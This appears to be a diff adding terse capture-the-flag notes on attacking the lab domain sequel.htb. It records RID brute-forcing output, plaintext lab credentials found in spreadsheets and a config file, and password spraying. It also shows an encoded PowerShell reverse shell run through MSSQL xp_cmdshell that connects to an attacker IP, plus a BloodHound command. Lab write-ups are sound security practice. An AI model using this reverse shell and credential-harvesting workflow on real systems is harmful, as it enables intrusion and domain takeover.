@@ -1,0 +1,70 @@
+rose / KxEPkKe6R8su
+
+crackmapexec --rid-brute:
+
+SMB         sequel.htb      445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
+SMB         sequel.htb      445    DC01             [+] sequel.htb\rose:KxEPkKe6R8su 
+SMB         sequel.htb      445    DC01             [+] Brute forcing RIDs
+SMB         sequel.htb      445    DC01             498: SEQUEL\Enterprise Read-only Domain Controllers (SidTypeGroup)
+SMB         sequel.htb      445    DC01             500: SEQUEL\Administrator (SidTypeUser)
+SMB         sequel.htb      445    DC01             501: SEQUEL\Guest (SidTypeUser)
+SMB         sequel.htb      445    DC01             502: SEQUEL\krbtgt (SidTypeUser)
+SMB         sequel.htb      445    DC01             512: SEQUEL\Domain Admins (SidTypeGroup)
+SMB         sequel.htb      445    DC01             513: SEQUEL\Domain Users (SidTypeGroup)
+SMB         sequel.htb      445    DC01             514: SEQUEL\Domain Guests (SidTypeGroup)
+SMB         sequel.htb      445    DC01             515: SEQUEL\Domain Computers (SidTypeGroup)
+SMB         sequel.htb      445    DC01             516: SEQUEL\Domain Controllers (SidTypeGroup)
+SMB         sequel.htb      445    DC01             517: SEQUEL\Cert Publishers (SidTypeAlias)
+SMB         sequel.htb      445    DC01             518: SEQUEL\Schema Admins (SidTypeGroup)
+SMB         sequel.htb      445    DC01             519: SEQUEL\Enterprise Admins (SidTypeGroup)
+SMB         sequel.htb      445    DC01             520: SEQUEL\Group Policy Creator Owners (SidTypeGroup)
+SMB         sequel.htb      445    DC01             521: SEQUEL\Read-only Domain Controllers (SidTypeGroup)
+SMB         sequel.htb      445    DC01             522: SEQUEL\Cloneable Domain Controllers (SidTypeGroup)
+SMB         sequel.htb      445    DC01             525: SEQUEL\Protected Users (SidTypeGroup)
+SMB         sequel.htb      445    DC01             526: SEQUEL\Key Admins (SidTypeGroup)
+SMB         sequel.htb      445    DC01             527: SEQUEL\Enterprise Key Admins (SidTypeGroup)
+SMB         sequel.htb      445    DC01             553: SEQUEL\RAS and IAS Servers (SidTypeAlias)
+SMB         sequel.htb      445    DC01             571: SEQUEL\Allowed RODC Password Replication Group (SidTypeAlias)
+SMB         sequel.htb      445    DC01             572: SEQUEL\Denied RODC Password Replication Group (SidTypeAlias)
+SMB         sequel.htb      445    DC01             1000: SEQUEL\DC01$ (SidTypeUser)
+SMB         sequel.htb      445    DC01             1101: SEQUEL\DnsAdmins (SidTypeAlias)
+SMB         sequel.htb      445    DC01             1102: SEQUEL\DnsUpdateProxy (SidTypeGroup)
+SMB         sequel.htb      445    DC01             1103: SEQUEL\michael (SidTypeUser)
+SMB         sequel.htb      445    DC01             1114: SEQUEL\ryan (SidTypeUser)
+SMB         sequel.htb      445    DC01             1116: SEQUEL\oscar (SidTypeUser)
+SMB         sequel.htb      445    DC01             1122: SEQUEL\sql_svc (SidTypeUser)
+SMB         sequel.htb      445    DC01             1128: SEQUEL\SQLServer2005SQLBrowserUser$DC01 (SidTypeAlias)
+SMB         sequel.htb      445    DC01             1129: SEQUEL\SQLRUserGroupSQLEXPRESS (SidTypeAlias)
+SMB         sequel.htb      445    DC01             1601: SEQUEL\rose (SidTypeUser)
+SMB         sequel.htb      445    DC01             1602: SEQUEL\Management Department (SidTypeGroup)
+SMB         sequel.htb      445    DC01             1603: SEQUEL\Sales Department (SidTypeGroup)
+SMB         sequel.htb      445    DC01             1604: SEQUEL\Accounting Department (SidTypeGroup)
+SMB         sequel.htb      445    DC01             1605: SEQUEL\Reception Department (SidTypeGroup)
+SMB         sequel.htb      445    DC01             1606: SEQUEL\Human Resources Department (SidTypeGroup)
+SMB         sequel.htb      445    DC01             1607: SEQUEL\ca_svc (SidTypeUser)
+
+
+
+accessing Accounting Department folder i found some xlsx files in which there were these accounts:
+
+Angela Martin angela@sequel.htb angela 0fwz7Q4mSpurIt99 
+Oscar Martinez oscar@sequel.htb oscar 86LxLBMgEWaKUnBG 
+Kevin Malone kevin@sequel.htb kevin Md9Wlq1E5bZnVDVo 
+NULL sa@sequel.htb sa MSSQLP@ssw0rd!
+
+now we do Password spraying
+
+we access mssql service with "sa". Here we can execute commands and reverse shell
+
+xp_cmdshell powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4ANQAiACwAOQAwADAAMQApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=
+
+
+we then read files inside sql2019 folder, in particular the file sql-Configuration.INI in which there are more credentials
+
+ryan WqSZAF6CysDQbGb3
+
+
+escalation:
+
+we run:
+bloodhound -u ryan -p "XXXXXXXXXXX" -d sequel.htb -ns 10.10.11.51 -c All
